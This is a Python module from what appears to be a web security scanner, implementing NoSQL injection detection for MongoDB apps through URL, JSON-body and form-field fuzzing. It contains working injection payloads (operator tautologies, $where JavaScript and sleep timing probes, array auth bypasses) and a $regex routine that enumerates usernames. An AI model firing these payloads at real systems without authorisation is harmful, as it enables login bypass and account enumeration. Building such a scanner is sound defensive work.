from __future__ import annotations

import json
import logging
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as _FutureTimeout
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import requests as _requests

from .base import BaseScanner
from websecure.core.payloads import load_external_payloads

logger = logging.getLogger(__name__)

# Context analysis now delegated to BaseScanner._should_skip_param (Fix 2+3)

# ---------------------------------------------------------------------------
# Payload definitions
# ---------------------------------------------------------------------------

_URL_STRING_PAYLOADS_CORE: List[Tuple[str, str]] = [
    ("' && '1'=='1", "js_tautology"),
    ("' || '1'=='1", "js_or_tautology"),
    ("'; return true; //", "js_return_true"),
    ("'; return 'a'=='a' && ''=='", "tautology_js2"),
    ("1', $or: [ {}, { 'a':'a", "or_injection"),
    ("' && this.password.match(/.*/)//+%00", "regex_bypass"),
    ("%24where%3D1%3D1", "where_encoded"),
]

def _load_nosqli_payloads() -> List[Tuple[str, str]]:
    """nosqli.txt'i yükle: JSON satırları -> _JSON_OPERATOR_PAYLOADS, string satırları -> _URL_STRING_PAYLOADS."""
    seen_str = {p for p, _ in _URL_STRING_PAYLOADS_CORE}
    extra_str: List[Tuple[str, str]] = []
    extra_json: List[Tuple[Any, str]] = []
    for line in load_external_payloads("nosqli"):
        if not line:
            continue
        stripped = line.strip()
        if stripped.startswith("{") or stripped.startswith("["):
            try:
                obj = json.loads(stripped)
                extra_json.append((obj, "ext_operator"))
            except (json.JSONDecodeError, ValueError) as _fix_e:
                logger.debug(f"[scanners.nosqli] {type(_fix_e).__name__}: {_fix_e!r}")
        elif stripped not in seen_str:
            seen_str.add(stripped)
            extra_str.append((stripped, "ext_string"))
    return extra_str, extra_json

_EXT_STR, _EXT_JSON = _load_nosqli_payloads()
_URL_STRING_PAYLOADS: List[Tuple[str, str]] = _URL_STRING_PAYLOADS_CORE + _EXT_STR

_BRACKET_OPERATORS: List[Tuple[str, str]] = [
    ("[$ne]", "ne_bracket"),
    ("[$gt]", "gt_bracket"),
    ("[$gte]", "gte_bracket"),
    ("[$regex]", "regex_bracket"),
    ("[$exists]", "exists_bracket"),
    ("[$in][]", "in_bracket"),
]

_JSON_OPERATOR_PAYLOADS: List[Tuple[Any, str]] = [
    ({"$ne": None},                      "ne_null"),
    ({"$ne": "-1"},                      "ne_string"),
    ({"$ne": ""},                        "ne_empty"),
    ({"$gt": ""},                        "gt_empty"),
    ({"$gt": 0},                         "gt_zero"),
    ({"$gte": ""},                       "gte_empty"),
    ({"$lt": "zzzzzzzzzzz"},             "lt_string"),
    ({"$regex": ".*"},                   "regex_all"),
    ({"$regex": "^", "$options": "i"},   "regex_prefix"),
    ({"$where": "1==1"},                 "where_tautology"),
    ({"$exists": True},                  "exists_true"),
    ({"$nin": []},                       "nin_empty"),
    ({"$in": ["admin", "user", "root"]}, "in_values"),
    ({"$expr": {"$eq": [1, 1]}},         "expr_tautology"),
] + _EXT_JSON

_ARRAY_BYPASS_PAYLOADS: List[Tuple[Any, str]] = [
    (["admin"],                    "array_single"),
    (["admin", "administrator"],   "array_multi"),
    ([""],                         "array_empty_str"),
]

_NOSQL_ERROR_PATTERNS = [
    r"MongoError",
    r"MongoNetworkError",
    r"CastError",
    r"ValidationError",
    r'"name"\s*:\s*"MongoError"',
    r"BSON.*error",
    r"ObjectId.*invalid",
    r"E11000 duplicate",
    r'"code"\s*:\s*1[1-9][0-9]',
    r"operator\s+\$where",
    r"SyntaxError.*where",
    r"unexpected token.*\$",
]

_AUTH_FIELDS = [
    "username", "user", "email", "login",
    "password", "pass", "passwd",
    "id", "token", "apikey",
]


# ---------------------------------------------------------------------------
# NoSQLiScanner
# ---------------------------------------------------------------------------

class NoSQLiScanner(BaseScanner):
    """
    NoSQL Injection Scanner.

    Techniques:
    - URL parameter string injection (tautologies, JS operators)
    - Bracket-style operator params (?param[$ne]=x, ?param[$regex]=.*)
    - JSON body operator injection ({"field": {"$ne": null}})
    - Array-based bypass ({"field": ["admin"]})
    - JavaScript injection via $where / $expr
    - Form field injection (HTML form inputs)
    - Auth bypass detection (401/403 -> 200)
    - MongoDB/NoSQL error message fingerprinting
    - Multi-signal response anomaly detection
    - Parallel payload testing via BaseScanner.run_parallel_probes()
    """

    name = "nosqli"
    MAX_WORKERS = 4
    # Max seconds spent in JS injection + enumeration phase
    JS_PHASE_BUDGET = 25.0

    def run(self, url: str, **kwargs) -> Dict:
        bucket = self.name
        self.results.setdefault(bucket, [])

        endpoints: List[str] = kwargs.get("endpoints") or [url]
        forms: List[Dict] = kwargs.get("forms") or []
        logger.info(f"[NoSQLi] Scanning {len(endpoints)} endpoints, {len(forms)} forms")

        for ep in endpoints:
            if not isinstance(ep, str):
                continue
            parsed = urlparse(ep)
            qs = parse_qsl(parsed.query)

            if qs:
                self._fuzz_url_params(ep, qs)

            lower = ep.lower()
            if any(x in lower for x in ("api", "auth", "login", "signin", "user", "v1", "v2", "account")):
                self._fuzz_json_body(ep)

        # Form field injection
        for form in forms:
            action = form.get("action") or url
            method = (form.get("method") or "POST").upper()
            inputs = form.get("inputs") or []
            self._fuzz_form(action, method, inputs)

        # JS injection phase — with time budget to prevent hang
        self._run_js_injection_phase(endpoints)
        return self.results

    # -------------------------------------------------------------------------
    # Form field fuzzing (issue 5 fix)
    # -------------------------------------------------------------------------

    def _fuzz_form(self, action: str, method: str, inputs: List[Dict]):
        """Inject NoSQLi payloads into each HTML form field."""
        skipped_types = {"submit", "button", "image", "reset", "file", "hidden", "checkbox", "radio"}
        fuzzable = [i for i in inputs if i.get("type", "text") not in skipped_types and i.get("name")]
        if not fuzzable:
            return

        base_data = {i["name"]: i.get("value", "test") for i in inputs if i.get("name")}

        # Baseline
        try:
            if method == "POST":
                base_resp = self.session.post(action, data=base_data, timeout=5)
            else:
                base_resp = self.session.get(action, params=base_data, timeout=5)
            if base_resp.status_code in (404, 405):
                return
        except Exception:
            return

        def test_form_field(args: Tuple) -> Optional[Dict]:
            field_name, op_payload, pay_type = args
            data = dict(base_data)
            data[field_name] = op_payload if isinstance(op_payload, str) else json.dumps(op_payload)
            try:
                if method == "POST":
                    resp = self.session.post(action, data=data, timeout=5)
                else:
                    resp = self.session.get(action, params=data, timeout=5)
                if self._is_anomaly(base_resp, resp):
                    return {
                        "vuln_type": "NoSQL Injection — Form Field",
                        "url": action,
                        "param": field_name,
                        "payload": json.dumps(op_payload) if not isinstance(op_payload, str) else op_payload,
                        "severity": "High",
                        "evidence": f"Status: {base_resp.status_code}->{resp.status_code}",
                        "extra": {"payload_type": pay_type, "method": method},
                    }
            except Exception as exc:
                logger.debug(f"[NoSQLi] Form fuzz error {action}: {exc!r}")
            return None

        # Build args: top 5 JSON operator payloads + string payloads per field
        all_args = []
        for inp in fuzzable:
            fn = inp["name"]
            for op_payload, pay_type in _JSON_OPERATOR_PAYLOADS[:8]:
                all_args.append((fn, op_payload, pay_type))
            for str_payload, pay_type in _URL_STRING_PAYLOADS_CORE[:4]:
                all_args.append((fn, str_payload, pay_type))

        hits = self.run_parallel_probes(
            test_form_field, all_args, max_workers=self.MAX_WORKERS, stop_on_first=False
        )
        for hit in hits:
            extra = hit.pop("extra", None)
            self.report_finding(**hit, extra=extra)

    # -------------------------------------------------------------------------
    # JS injection phase — with time budget
    # -------------------------------------------------------------------------

    def _run_js_injection_phase(self, endpoints: List[str]) -> None:
        """
        Coordinates Adım 5 advanced NoSQLi:
        1. $where JavaScript injection (timing + tautology)
        2. Username enumeration via $regex prefix matching

        Hard time budget: JS_PHASE_BUDGET seconds total.
        """
        js_prober = NoSQLiJSInjectionProber()
        extractor = MongoDBDataExtractor()

        # Limit to 3 API-like endpoints and enforce total time budget
        api_endpoints = [
            ep for ep in endpoints[:6]
            if any(x in ep.lower() for x in ("api", "auth", "login", "signin", "user"))
        ][:3]

        budget_start = time.monotonic()

        for ep in api_endpoints:
            if time.monotonic() - budget_start > self.JS_PHASE_BUDGET:
                logger.debug("[NoSQLi] JS phase budget exhausted — stopping early")
                break

            # $where JS injection
            base_resp = None
            try:
                base_resp = self.session.post(ep, json={"username": "x", "password": "y"}, timeout=5)
            except Exception as exc:
                logger.debug("[NoSQLiScanner] Base request failed for %s: %s", ep, exc)

            remaining = self.JS_PHASE_BUDGET - (time.monotonic() - budget_start)
            for f in js_prober.probe(ep, self.session, base_resp, budget_s=max(5.0, remaining * 0.5)):
                self.report_finding(**f)

            remaining = self.JS_PHASE_BUDGET - (time.monotonic() - budget_start)
            if remaining < 3:
                break

            # Username enumeration via $regex (short budget)
            usernames = extractor.extract_usernames(ep, self.session, budget_s=min(8.0, remaining * 0.4))
            if usernames:
                self.report_finding(
                    vuln_type="NoSQL Injection — Username Enumeration ($regex)",
                    url=ep,
                    param="username",
                    payload='{"username":{"$regex":"^<prefix>"}}',
                    severity="High",
                    evidence=f"Enumerated username prefixes: {', '.join(usernames)}",
                )

    # -------------------------------------------------------------------------
    # URL parameter fuzzing
    # -------------------------------------------------------------------------

    def _fuzz_url_params(self, url: str, qs: List[Tuple]):
        parsed = urlparse(url)
        base_resp = self.fetch_baseline(url, timeout=5)
        if not base_resp:
            return

        params = [p for p, _ in qs]

        def test_string_append(args: Tuple) -> Optional[Dict]:
            param, payload_str, pay_type = args
            new_qs = [(p, v + payload_str if p == param else v) for p, v in qs]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            try:
                resp = self.session.get(t_url, timeout=5)
                if self._is_anomaly(base_resp, resp):
                    return {
                        "vuln_type": "NoSQL Injection — URL Parameter",
                        "url": t_url,
                        "param": param,
                        "payload": payload_str,
                        "severity": "High",
                        "evidence": (
                            f"Status: {base_resp.status_code}->{resp.status_code}, "
                            f"len: {len(base_resp.content)}->{len(resp.content)}"
                        ),
                        "extra": {"payload_type": pay_type},
                    }
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[NoSQLi] String probe timed out for {t_url}: {exc!r}")
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[NoSQLi] String probe connection error for {t_url}: {exc!r}")
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[NoSQLi] String probe failed for {t_url}: {exc!r}")
            return None

        def test_bracket_op(args: Tuple) -> Optional[Dict]:
            param, op, label = args
            new_qs = [(p, v) for p, v in qs if p != param] + [(param + op, "test")]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            try:
                resp = self.session.get(t_url, timeout=5)
                if self._is_anomaly(base_resp, resp):
                    return {
                        "vuln_type": "NoSQL Injection — Bracket Operator Param",
                        "url": t_url,
                        "param": f"{param}{op}",
                        "payload": op,
                        "severity": "High",
                        "evidence": f"Status: {base_resp.status_code}->{resp.status_code}",
                        "extra": {"payload_type": label},
                    }
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[NoSQLi] Bracket probe timed out for {t_url}: {exc!r}")
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[NoSQLi] Bracket probe connection error for {t_url}: {exc!r}")
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[NoSQLi] Bracket probe failed for {t_url}: {exc!r}")
            return None

        # Build all probe args
        string_args = []
        bracket_args = []
        for param in params:
            if self._should_skip_param(param, "nosqli"):
                continue
            for payload_str, pay_type in _URL_STRING_PAYLOADS:
                string_args.append((param, payload_str, pay_type))
            for op, label in _BRACKET_OPERATORS:
                bracket_args.append((param, op, label))

        # run_parallel_probes with stop_on_first=False to collect all hits
        hits = self.run_parallel_probes(
            test_string_append, string_args, max_workers=self.MAX_WORKERS, stop_on_first=False
        )
        hits += self.run_parallel_probes(
            test_bracket_op, bracket_args, max_workers=self.MAX_WORKERS, stop_on_first=False
        )
        for hit in hits:
            extra = hit.pop("extra", None)
            self.report_finding(**hit, extra=extra)

    # -------------------------------------------------------------------------
    # JSON body fuzzing
    # -------------------------------------------------------------------------

    def _fuzz_json_body(self, url: str):
        baseline = {"username": "testuser", "password": "testpass"}
        base_resp = None
        try:
            base_resp = self.session.post(url, json=baseline, timeout=5)
            if base_resp.status_code in (404, 405):
                return
        except _requests.exceptions.Timeout as exc:
            logger.warning(f"[NoSQLi] JSON baseline timed out for {url}: {exc!r}")
            return
        except _requests.exceptions.ConnectionError as exc:
            logger.warning(f"[NoSQLi] JSON baseline connection error for {url}: {exc!r}")
            return
        except _requests.exceptions.RequestException as exc:
            logger.error(f"[NoSQLi] JSON baseline failed for {url}: {exc!r}")
            return

        def test_operator(args: Tuple) -> Optional[Dict]:
            key, op_payload, pay_type = args
            attack = {**baseline, key: op_payload}
            try:
                resp = self.session.post(url, json=attack, timeout=5)
                if base_resp.status_code in (401, 403) and resp.status_code == 200:
                    return {
                        "vuln_type": "NoSQL Auth Bypass",
                        "url": url,
                        "param": key,
                        "payload": json.dumps(op_payload),
                        "severity": "Critical",
                        "evidence": f"Auth bypass: {base_resp.status_code}->200",
                        "extra": {"payload_type": pay_type},
                    }
                if self._is_anomaly(base_resp, resp):
                    return {
                        "vuln_type": "NoSQL Injection — JSON Body",
                        "url": url,
                        "param": key,
                        "payload": json.dumps(op_payload),
                        "severity": "High",
                        "evidence": (
                            f"Status: {base_resp.status_code}->{resp.status_code}, "
                            f"len: {len(base_resp.content)}->{len(resp.content)}"
                        ),
                        "extra": {"payload_type": pay_type},
                    }
            except _requests.exceptions.Timeout as exc:
                logger.debug(f"[NoSQLi] JSON operator probe timed out for {url}: {exc!r}")
            except _requests.exceptions.ConnectionError as exc:
                logger.debug(f"[NoSQLi] JSON operator probe connection error: {exc!r}")
            except _requests.exceptions.RequestException as exc:
                logger.warning(f"[NoSQLi] JSON operator probe failed for {url}: {exc!r}")
            return None

        all_args = []
        for key in _AUTH_FIELDS:
            for op_payload, pay_type in _JSON_OPERATOR_PAYLOADS:
                all_args.append((key, op_payload, pay_type))
            for arr_payload, arr_type in _ARRAY_BYPASS_PAYLOADS:
                all_args.append((key, arr_payload, arr_type))

        hits = self.run_parallel_probes(
            test_operator, all_args, max_workers=self.MAX_WORKERS, stop_on_first=False
        )
        for hit in hits:
            extra = hit.pop("extra", None)
            self.report_finding(**hit, extra=extra)

    # -------------------------------------------------------------------------
    # Multi-signal anomaly detection
    # -------------------------------------------------------------------------

    def _is_anomaly(self, base_resp, attack_resp) -> bool:
        atk_text = attack_resp.text or ""
        base_text = base_resp.text or ""

        for pat in _NOSQL_ERROR_PATTERNS:
            if re.search(pat, atk_text, re.IGNORECASE):
                if not re.search(pat, base_text, re.IGNORECASE):
                    return True

        if base_resp.status_code in (401, 403) and attack_resp.status_code == 200:
            return True

        if base_resp.status_code == 200 and attack_resp.status_code == 500:
            return True

        if attack_resp.status_code == 200:
            base_len = len(base_resp.content)
            atk_len = len(attack_resp.content)
            if base_len > 0:
                if abs(base_len - atk_len) / base_len > 0.40:
                    return True
            elif atk_len > 100:
                return True

        return False


# ---------------------------------------------------------------------------
# Legacy entry points (backward-compatible with main.py ctx convention)
# ---------------------------------------------------------------------------

def run_nosqli_scan(ctx):
    session = ctx.session
    results = getattr(ctx, "results", {})

    endpoints: set = set(results.get("endpoints", []))
    discovery = results.get("discovery", {})
    if isinstance(discovery, dict):
        for u in discovery.get("query", []):
            if isinstance(u, str) and "://" in u:
                endpoints.add(u)

    targets = list(endpoints)
    # forms_meta'dan keşfedilen form alanlarını da geçir — önceden NoSQLi yalnız
    # endpoint'leri alıyordu, login/signup form alanları (username/password) hiç
    # NoSQL operatörüyle test edilmiyordu.
    forms = []
    for _page in (results.get("forms_meta", []) or []):
        if isinstance(_page, dict):
            forms.extend(_page.get("forms", []))
    scanner = NoSQLiScanner(session=session, results=results)
    if targets or forms:
        _t0 = targets[0] if targets else (getattr(ctx, "url", "") or getattr(ctx, "base_url", ""))
        scanner.run(_t0, endpoints=targets, forms=forms)


def run(url: str, session=None, results: dict = None, debug: bool = False,
        timeout: float = 10.0, endpoints=None, forms=None, **kwargs) -> None:
    """Standard (url, session=, results=, forms=, ...) entry point for phase runner."""
    if results is None:
        results = {}
    _endpoints = list(endpoints) if endpoints else [url]
    _forms = list(forms) if forms else []
    scanner = NoSQLiScanner(session=session, results=results, debug=debug)
    scanner.run(_endpoints[0] if _endpoints else url, endpoints=_endpoints, forms=_forms)


# ===========================================================================
# Adım 5 — NoSQLi Advanced Standalone Classes
# ===========================================================================

_NOSQLI_JS_PAYLOADS: List[Tuple[Any, str]] = [
    # Tautology / always-true
    ({"$where": "1==1"},                                    "js_tautology"),
    ({"$where": "this.password.match(/.*/)"},               "js_regex_match"),
    ({"$where": "this.username.match(/^a/)"},               "js_prefix_match"),
    # Time-based (shorter sleep to avoid hang)
    ({"$where": "sleep(1000)||1==1"},                       "js_sleep_tautology"),
    # $expr injection (MongoDB 3.6+)
    ({"$expr": {"$eq": [1, 1]}},                           "expr_tautology"),
    ({"$expr": {"$gt": ["$password", ""]}},                "expr_gt_empty"),
    # Function constructor
    ({"$where": "new Function('return true')()"},           "js_function_ctor"),
]


class NoSQLiJSInjectionProber:
    """
    MongoDB $where / $expr JavaScript injection prober.
    Detects: timing-based, tautology auth bypass, JS error signatures.
    Single Responsibility: JS injection surface detection only.
    Parallelized for speed — total time bounded by budget_s.
    """
    _PAYLOADS: List[Tuple[Any, str]] = _NOSQLI_JS_PAYLOADS
    _JS_ERROR_RE = re.compile(
        r"(?:MongoError|JS.*error|\$where|SyntaxError.*where|"
        r"server.*crash|execution.*timed|RangeError)",
        re.I,
    )
    _AUTH_FIELDS = ["username", "user", "email", "login", "password"]

    def probe(
        self,
        url: str,
        session: Any,
        baseline_resp: Optional[Any] = None,
        timeout: int = 6,
        budget_s: float = 15.0,
    ) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        base_status = baseline_resp.status_code if baseline_resp else 200
        base_len = len(baseline_resp.content) if baseline_resp else 0

        def _test(field: str, payload: Any, tech: str) -> Optional[Dict[str, Any]]:
            body = {field: payload, "password": {"$ne": ""}}
            try:
                t0 = time.time()
                resp = session.post(url, json=body, timeout=timeout)
                elapsed = time.time() - t0
                text = resp.text or ""

                is_bypass = base_status in (401, 403) and resp.status_code == 200
                is_timing = elapsed > 0.9 and "sleep" in tech
                is_error  = bool(self._JS_ERROR_RE.search(text))
                is_size   = resp.status_code == 200 and abs(len(resp.content) - base_len) > 50

                if is_bypass or is_timing or is_error or is_size:
                    return {
                        "vuln_type": "NoSQL JavaScript Injection ($where / $expr)",
                        "url": url,
                        "param": field,
                        "payload": json.dumps(payload),
                        "severity": "Critical" if is_bypass else "High",
                        "evidence": (
                            f"Auth bypass {base_status}->{resp.status_code}" if is_bypass
                            else f"JS timing: {elapsed:.2f}s" if is_timing
                            else "JS error in response" if is_error
                            else f"Response size changed: {base_len}->{len(resp.content)}"
                        ),
                    }
            except Exception as exc:
                logger.debug("[JSInjectionProber] Probe error for %s: %s", url, exc)
            return None

        # Parallelise across fields × payloads — all workers, bounded by budget
        tasks = [
            (field, payload, tech)
            for field in self._AUTH_FIELDS
            for payload, tech in self._PAYLOADS
        ]

        seen_fields: set = set()
        deadline = time.monotonic() + budget_s

        with ThreadPoolExecutor(max_workers=5) as pool:
            fut_map = {pool.submit(_test, f, p, t): f for f, p, t in tasks}
            try:
                for fut in as_completed(fut_map, timeout=max(1, deadline - time.monotonic())):
                    if time.monotonic() > deadline:
                        for f in fut_map:
                            f.cancel()
                        break
                    field = fut_map[fut]
                    if field in seen_fields:
                        continue
                    try:
                        result = fut.result()
                    except Exception:
                        continue
                    if result:
                        findings.append(result)
                        seen_fields.add(field)
            except _FutureTimeout:
                logger.debug("[JSInjectionProber] Budget exhausted — partial results returned")
                for f in fut_map:
                    f.cancel()

        return findings


class MongoDBDataExtractor:
    """
    MongoDB data extraction via NoSQLi.
    Techniques: $regex prefix matching for enumeration.
    Single Responsibility: data extraction from confirmed NoSQLi only.
    Bounded by budget_s to prevent infinite hang.
    """

    _CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_@"
    _MAX_DEPTH = 3   # was 5 — reduced to limit total requests
    # Only try the most common first chars
    _START_CHARS = "aeiousr01"

    def extract_usernames(
        self,
        url: str,
        session: Any,
        timeout: int = 5,
        budget_s: float = 8.0,
    ) -> List[str]:
        """
        Enumerate usernames via $regex prefix matching.
        Returns list of discovered username prefixes.
        Hard-bounded by budget_s seconds.
        """
        found: List[str] = []
        deadline = time.monotonic() + budget_s

        for start_ch in self._START_CHARS:
            if time.monotonic() > deadline:
                break
            prefix = self._grow_prefix(start_ch, url, session, timeout, deadline)
            if prefix and prefix not in found:
                found.append(prefix + "*")
            if len(found) >= 3:
                break
        return found

    def _grow_prefix(
        self, start: str, url: str, session: Any, timeout: int, deadline: float
    ) -> Optional[str]:
        prefix = start
        for _ in range(self._MAX_DEPTH - 1):
            if time.monotonic() > deadline:
                break
            next_ch = self._find_next_char(prefix, url, session, timeout, deadline)
            if not next_ch:
                break
            prefix += next_ch
        return prefix if len(prefix) > 1 else None

    def _find_next_char(
        self, prefix: str, url: str, session: Any, timeout: int, deadline: float
    ) -> Optional[str]:
        for ch in self._CHARSET:
            if time.monotonic() > deadline:
                return None
            payload = {"username": {"$regex": f"^{re.escape(prefix + ch)}"}, "password": {"$ne": ""}}
            try:
                resp = session.post(url, json=payload, timeout=timeout)
                if resp.status_code == 200 and len(resp.content) > 10:
                    return ch
            except Exception as exc:
                logger.debug("[MongoDBDataExtractor] Probe error: %s", exc)
                continue
        return None
